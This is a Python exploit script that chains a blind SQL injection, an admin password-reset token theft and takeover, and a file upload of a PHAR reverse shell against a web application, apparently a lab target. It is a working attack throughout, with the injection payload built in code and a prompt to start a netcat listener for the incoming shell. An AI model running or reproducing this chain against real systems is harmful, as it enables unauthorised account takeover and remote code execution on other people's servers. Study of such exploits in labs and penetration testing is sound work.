import sys, re, requests, os, json

''' Request a new token -------------------------------------------------'''

def doRequestNewPasswordResetToken(session):
    print("[+] Requesting password reset token...")
    d = {"username":"admin"}
    r = session.post("http://" + ip + "/login/resetPassword.php", data=d)

''' The SQLi attack -----------------------------------------------------'''

''' function to start the SQLi and return the reset token '''
def doSQLiForResetToken(session):
    print("[+] Using SQLi to get the password reset token...")
    query = "SELECT token FROM user WHERE id = 1"

    reset_token = ""

    for x in range(1, 16):
        character = findChar(session, x, query)
        reset_token = reset_token + str(character)
    
    return reset_token

''' finds a character in the SQL query, using the blind SQLi '''
def findChar(session, pos, query):
    for x in range(46, 122):
        if sqli(session, x, pos, query) == True:
            sys.stdout.write(chr(x))
            sys.stdout.flush()
            return chr(x)

''' makes the blind SQLi requests '''
def sqli(session, ascii_char, pos, query):
    query = query.replace(" ", "+")
    injection_string = "1+and+(select+ascii(substring((" + query + ")," + str(pos) + ",1)))=" + str(ascii_char)
    target = "http://%s/item/viewItem.php?id=%s" % (ip, injection_string)

    r = session.get(target)
    if r.status_code != 404:
        return False
    else:
        return True

''' Change the password -------------------------------------------------'''

def doChangePassword(session, token, new_password):
    print("[+] Changing the admin password to " + new_password)

    r = session.get("http://" + ip + "/login/doChangePassword.php?token=" + token + "&password=" + new_password)

''' Login and return the PHPSESSID ---------------------------------------'''

def doLogin(session, password):
    print("[+] Logging in to the web app...")

    r = session.get("http://" + ip + "/login/login.php")
    r = session.post("http://" + ip + "/login/checkLogin.php", data={"username":"admin","password":password})

''' Upload and execute a shell ---------------------------------------'''

def doReverseShell(session):
    print("[+] Uploading malicious shell...")
    f = open("./shell.txt")
    s = f.read()
    f.close()

    session.headers.update({"Content-Type":"multipart/form-data; boundary=---------------------------414018432521906484031543370952"})

    r = session.post("http://" + ip + "/item/updateItem.php", data=s)

    print("[+] Executing malicious shell...")
    session.get("http://" + ip + "/item/image/malicious.phar")

''' The mainz init ---------------------------------------------------'''

def main():
    if len(sys.argv) < 3:
        print("[!] Usage: %s [target] [password]" % (sys.argv[0]))
        sys.exit(-1)

    global ip 
    ip = sys.argv[1]
    password = sys.argv[2]

    print("[+] Don't forget to start your netcat listener: nc -nvlp 4444")

    session = requests.Session()

    doRequestNewPasswordResetToken(session)

    reset_token = doSQLiForResetToken(session)
    print("\r[+] Found password reset token: " + reset_token)

    doChangePassword(session, reset_token, password)

    doLogin(session, password)

    print("[+] Checking access...")

    r = session.get("http://" + ip + "/users/")
    if "You not have access to visit that page" in r.text:
        print("[!] Not permitted, will exit!")
        sys.exit(-1)
    else:
        print("[+] Permitted, will continue...")

    doReverseShell(session)

if __name__ == "__main__":
    main()
